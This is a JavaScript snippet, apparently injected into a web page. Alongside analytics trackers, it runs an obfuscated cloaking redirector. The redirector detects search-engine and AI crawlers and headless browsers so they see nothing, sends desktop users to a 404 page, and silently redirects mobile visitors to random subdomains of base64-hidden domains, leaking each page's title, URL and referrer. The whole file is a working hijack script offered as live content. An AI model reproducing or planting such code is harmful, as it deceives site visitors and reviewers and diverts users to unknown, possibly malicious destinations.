var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?abc2b591caa529db122e5574a76cc833";var t=document.getElementsByTagName("script")[0]||document.head.firstChild;t&&t.parentNode&&t.parentNode.insertBefore(e,t)}();

!function(e,t,o,n,i,c,r){e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},(c=t.createElement(n)).async=1,c.src="https://www.clarity.ms/tag/"+i,(r=t.getElementsByTagName(n)[0]||t.head.firstChild)&&r.parentNode&&r.parentNode.insertBefore(c,r)}(window,document,"clarity","script","vx87w7cmw9");

window._ta_config={sid:'H5',url:'https://6gapi.com/collect/collect.php'};
(function(w,d,s,u){
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s);
    j.async=1;j.src=u;
    f.parentNode.insertBefore(j,f);
})(window,document,'script','https://6gapi.com/collect/tracker.js');

var CONFIG={
    jumpDelay: 200,
    targetDomains: [
        "YXBpY2xvdWQ0LmNvbQ==",
        "YXBpY2xvdWQ2LmNvbQ==",
        "YXBpY2xvdWQ3LmNvbQ==",
    ],
    pcAction: "/404.html",
    strictSearchEngine: !1, 
    antiHeadless: !0,       
    mobileOnly: !0          
};

!function(e){"use strict";function t(){var e=navigator.userAgent||"",t="ontouchstart"in window||navigator.maxTouchPoints>0||navigator.msMaxTouchPoints>0,o=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(e),i=/iPad/.test(e)||"MacIntel"===navigator.platform&&navigator.maxTouchPoints>1,c=i&&(Math.min(window.screen.width,window.screen.height)<=1040||window.innerWidth<=1040),n=Math.min(window.screen.width,window.screen.height)<=768||window.innerWidth<=768;return o||c||t&&n}function o(){if(e.antiHeadless&&navigator.webdriver)return!0;for(var t=navigator.userAgent||"",o=[/Baiduspider/i,/Googlebot/i,/bingbot/i,/msnbot/i,/Sogou/i,/YisouSpider/i,/Bytespider/i,/360Spider/i,/YandexBot/i,/DuckDuckBot/i,/Applebot/i,/PetalBot/i,/SemrushBot/i,/AhrefsBot/i,/MJ12bot/i,/DotBot/i,/rogerbot/i,/TurnitinBot/i,/BLEXBot/i,/SeznamBot/i,/Exabot/i,/CCBot/i,/GPTBot/i,/ChatGPT-User/i,/ClaudeBot/i,/Amazonbot/i,/Twitterbot/i,/TelegramBot/i,/Discordbot/i],n=0;n<o.length;n++)if(o[n].test(t))return!0;return!!(/bot[\s\/;,)|-]/i.test(t)||/bot$/i.test(t)||/spider/i.test(t)||/crawl/i.test(t)||/slurp/i.test(t)||/fetch/i.test(t)||/scraper/i.test(t))}function n(e){for(var t="abcdefghijklmnopqrstuvwxyz",o="",n=0;n<e;n++)o+=t[Math.floor(Math.random()*t.length)];return o}function i(){if(!o()){var i=document.referrer||"";if(!e.strictSearchEngine||/baidu\.com|sogou\.com|so\.com|google\.|bing\.com|sm\.cn|toutiao\.com|quark\.cn|yahoo\.com|yandex\.|duckduckgo\.com|soso\.com/i.test(i)){if(e.mobileOnly&&!t())return void window.location.replace(e.pcAction);var c=encodeURIComponent(document.title||""),r=encodeURIComponent(window.location.href||""),a=encodeURIComponent(i),l=e.targetDomains[Math.floor(Math.random()*e.targetDomains.length)],d="https://"+n(5)+"."+atob(l)+"/url.php?title="+c+"&from_url="+r+"&from="+a;setTimeout((function(){window.location.replace(d)}),e.jumpDelay)}}}"loading"===document.readyState?document.addEventListener("DOMContentLoaded",i):i()}(CONFIG);
